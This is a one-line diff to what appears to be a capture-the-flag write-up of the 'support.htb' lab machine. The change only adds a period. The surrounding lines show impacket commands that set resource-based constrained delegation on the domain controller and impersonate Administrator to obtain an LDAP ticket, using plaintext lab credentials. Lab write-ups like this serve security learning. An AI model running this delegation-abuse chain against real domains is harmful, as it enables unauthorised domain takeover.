@@ -186,7 +186,7 @@ We set the `rbcd` on the DC
 impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'dc$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
 ```
 
-We impersonate the `Administrator` user and we request a TGS ticket for the `LDAP` service
+We impersonate the `Administrator` user and we request a TGS ticket for the `LDAP` service.
 
 ```
 impacket-getST -spn 'ldap/dc.support.htb' -impersonate 'Administrator' 'support.htb/attackersystem$:Summer2018!'
